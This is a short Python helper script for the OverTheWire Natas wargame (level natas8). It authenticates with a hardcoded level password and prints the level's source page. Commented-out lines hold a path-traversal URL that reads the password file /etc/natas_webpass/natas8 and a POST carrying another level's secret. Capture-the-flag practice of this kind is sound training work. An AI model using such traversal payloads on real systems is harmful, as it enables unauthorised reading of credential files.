# -*- coding: UTF-8 -*-

from bs4 import BeautifulSoup as bs
import requests
import re

u='natas8'
p='DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe'
l=f'http://{u}.natas.labs.overthewire.org/index-source.html'
#l=f'http://{u}.natas.labs.overthewire.org/index.php?page=../../../../etc/natas_webpass/natas8'
#resp=requests.post(l,data={"secret":"FOEIUWGHFEEUHOFUOIU","submit":"submit"},auth=(u, p))
resp=requests.post(l,auth=(u, p))
t=resp.text
print(bs(t,'html.parser').prettify())
#print(re.findall(r'<br>\n(.*)\n\n',t)[0])
